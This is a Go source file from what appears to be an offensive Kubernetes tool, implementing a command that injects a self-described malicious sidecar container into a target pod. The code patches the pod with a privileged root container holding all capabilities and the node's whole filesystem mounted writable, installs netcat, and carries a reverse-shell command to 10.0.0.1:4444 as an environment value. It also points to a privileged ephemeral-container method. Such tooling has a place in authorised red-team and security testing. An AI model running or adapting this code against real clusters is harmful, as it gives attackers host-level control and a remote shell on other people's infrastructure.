package cluster_exploit

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"

	"kubeshadow/pkg/errors"
	"kubeshadow/pkg/logger"

	"github.com/spf13/cobra"
	v1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/types"
	"k8s.io/apimachinery/pkg/util/yaml"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/tools/clientcmd"
)

type SidecarConfig struct {
	Name  string             `json:"name"`
	Image string             `json:"image"`
	Env   []v1.EnvVar        `json:"env,omitempty"`
	Ports []v1.ContainerPort `json:"ports,omitempty"`
	Cmd   []string           `json:"command,omitempty"`
	Args  []string           `json:"args,omitempty"`
}

var (
	// SidecarInjectCmd represents the command for the sidecar injection module
	SidecarInjectCmd = &cobra.Command{
		Use:   "sidecar-inject",
		Short: "Inject a malicious sidecar container into a pod",
		RunE: func(cmd *cobra.Command, args []string) error {
			mode, _ := cmd.Flags().GetString("mode")
			pod, _ := cmd.Flags().GetString("pod")
			namespace, _ := cmd.Flags().GetString("namespace")
			config, _ := cmd.Flags().GetString("config")

			if err := validateSidecarFlags(mode, pod, namespace, config); err != nil {
				return err
			}

			return injectSidecar(cmd.Context(), mode, pod, namespace, config)
		},
	}
)

func init() {
	SidecarInjectCmd.Flags().String("mode", "api", "Injection mode (api or manifest)")
	SidecarInjectCmd.Flags().String("pod", "", "Target pod name")
	SidecarInjectCmd.Flags().String("namespace", "default", "Target namespace")
	SidecarInjectCmd.Flags().String("config", "", "Path to sidecar configuration file")

	if err := SidecarInjectCmd.MarkFlagRequired("pod"); err != nil {
		logger.Error("Failed to mark pod flag as required: %v", err)
	}
	if err := SidecarInjectCmd.MarkFlagRequired("config"); err != nil {
		logger.Error("Failed to mark config flag as required: %v", err)
	}
}

func validateSidecarFlags(mode, pod, namespace, config string) error {
	if pod == "" {
		return errors.New(errors.ErrValidation, "pod name is required", nil)
	}
	if namespace == "" {
		return errors.New(errors.ErrValidation, "namespace is required", nil)
	}
	if config == "" {
		return errors.New(errors.ErrValidation, "config path is required", nil)
	}
	if mode != "api" && mode != "manifest" {
		return errors.New(errors.ErrValidation, fmt.Sprintf("unsupported mode: %s", mode), nil)
	}

	// Validate config file (convert to absolute path if relative)
	if !filepath.IsAbs(config) {
		// Try to resolve relative path
		wd, err := os.Getwd()
		if err != nil {
			return errors.New(errors.ErrValidation, "failed to get working directory", err)
		}
		config = filepath.Join(wd, config)
	}
	if _, err := os.Stat(config); err != nil {
		return errors.New(errors.ErrValidation, fmt.Sprintf("failed to access config file: %s", config), err)
	}

	return nil
}

func injectSidecar(ctx context.Context, mode, pod, namespace, config string) error {
	// Use parameters to avoid unused parameter warnings
	_ = mode
	_ = config

	// Get Kubernetes client
	kubeconfig := filepath.Join(os.Getenv("HOME"), ".kube", "config")
	clientConfig, err := clientcmd.BuildConfigFromFlags("", kubeconfig)
	if err != nil {
		return errors.New(errors.ErrK8s, "failed to build kubeconfig", err)
	}

	clientset, err := kubernetes.NewForConfig(clientConfig)
	if err != nil {
		return errors.New(errors.ErrK8s, "failed to create kubernetes client", err)
	}

	// Get target pod
	targetPod, err := clientset.CoreV1().Pods(namespace).Get(ctx, pod, metav1.GetOptions{})
	if err != nil {
		return errors.New(errors.ErrK8s, fmt.Sprintf("failed to get pod %s", pod), err)
	}

	// Load sidecar configuration from injected-pod.yaml template
	sidecar, err := loadSidecarFromTemplate()
	if err != nil {
		return errors.New(errors.ErrK8s, "failed to load sidecar template", err)
	}

	// Check if sidecar already exists
	for _, container := range targetPod.Spec.Containers {
		if container.Name == sidecar.Name {
			logger.Info("Sidecar %s already exists in pod %s", sidecar.Name, pod)
			return nil
		}
	}

	// Add host volume mount for sidecar access
	hostVolume := v1.Volume{
		Name: "host-root",
		VolumeSource: v1.VolumeSource{
			HostPath: &v1.HostPathVolumeSource{
				Path: "/",
				Type: &[]v1.HostPathType{v1.HostPathDirectory}[0],
			},
		},
	}

	// Check if volume already exists
	volumeExists := false
	for _, vol := range targetPod.Spec.Volumes {
		if vol.Name == "host-root" {
			volumeExists = true
			break
		}
	}

	// Create patch payload
	patchPod := v1.Pod{
		Spec: v1.PodSpec{
			Containers: append(targetPod.Spec.Containers, *sidecar),
		},
	}

	// Add volume if needed
	if !volumeExists {
		patchPod.Spec.Volumes = append(targetPod.Spec.Volumes, hostVolume)
	} else {
		patchPod.Spec.Volumes = targetPod.Spec.Volumes
	}

	// Serialize to JSON for patch
	patchData, err := json.Marshal(patchPod)
	if err != nil {
		return errors.New(errors.ErrK8s, "failed to marshal patch data", err)
	}

	// Use strategic merge patch to add sidecar
	// Note: Kubernetes doesn't allow adding containers to running pods via Update(),
	// but we can try a strategic merge patch. If this fails, we'll use ephemeral containers instead.
	_, err = clientset.CoreV1().Pods(namespace).Patch(
		ctx,
		pod,
		types.StrategicMergePatchType,
		patchData,
		metav1.PatchOptions{},
	)

	if err != nil {
		// If patch fails, Kubernetes doesn't allow adding containers to running pods
		// Suggest using ephemeral containers instead
		logger.Error("Failed to inject sidecar container: %v", err)
		logger.Info("Note: Kubernetes doesn't allow adding containers to running pods.")
		logger.Info("Consider using ephemeral containers instead:")
		logger.Info("  kubeshadow exploitation ephemeral --action inject --target-pod %s --namespace %s --image %s --privileged",
			pod, namespace, sidecar.Image)
		return errors.New(errors.ErrK8s, "failed to inject sidecar: Kubernetes doesn't allow adding containers to running pods. Use ephemeral containers instead", err)
	}

	logger.Info("Successfully injected sidecar into pod %s", pod)
	return nil
}

// loadSidecarFromTemplate loads sidecar configuration from injected-pod.yaml template
func loadSidecarFromTemplate() (*v1.Container, error) {
	// Try to load from injected-pod.yaml template
	templatePath := "modules/exploitation/injected-pod.yaml"
	if _, err := os.Stat(templatePath); err != nil {
		// If template doesn't exist, return the enhanced sidecar configuration
		return createEnhancedSidecar(), nil
	}

	// Read the template file
	templateData, err := os.ReadFile(templatePath)
	if err != nil {
		return nil, fmt.Errorf("failed to read template file: %v", err)
	}

	// Parse YAML to extract sidecar container
	var pod v1.Pod
	decoder := yaml.NewYAMLOrJSONDecoder(bytes.NewReader(templateData), 4096)
	if err := decoder.Decode(&pod); err != nil {
		return nil, fmt.Errorf("failed to parse template YAML: %v", err)
	}

	// Find the malicious-sidecar container in the template
	for _, container := range pod.Spec.Containers {
		if container.Name == "malicious-sidecar" {
			return &container, nil
		}
	}

	// If not found, return enhanced sidecar
	return createEnhancedSidecar(), nil
}

// createEnhancedSidecar creates an enhanced malicious sidecar based on injected-pod.yaml
func createEnhancedSidecar() *v1.Container {
	return &v1.Container{
		Name:  "malicious-sidecar",
		Image: "alpine:latest",
		Command: []string{
			"/bin/sh",
		},
		Args: []string{
			"-c",
			"apk add --no-cache netcat-openbsd && while true; do sleep 30; done",
		},
		Env: []v1.EnvVar{
			{
				Name:  "SHELL_PAYLOAD",
				Value: "nc -e /bin/sh 10.0.0.1 4444",
			},
			{
				Name:  "SIDECAR_INJECTED",
				Value: "true",
			},
			{
				Name:  "HOST_ACCESS",
				Value: "enabled",
			},
		},
		VolumeMounts: []v1.VolumeMount{
			{
				Name:      "host-root",
				MountPath: "/host",
				ReadOnly:  false,
			},
		},
		SecurityContext: &v1.SecurityContext{
			Privileged:               &[]bool{true}[0],
			RunAsUser:                &[]int64{0}[0],
			RunAsGroup:               &[]int64{0}[0],
			AllowPrivilegeEscalation: &[]bool{true}[0],
			Capabilities: &v1.Capabilities{
				Add: []v1.Capability{"ALL"},
			},
		},
	}
}
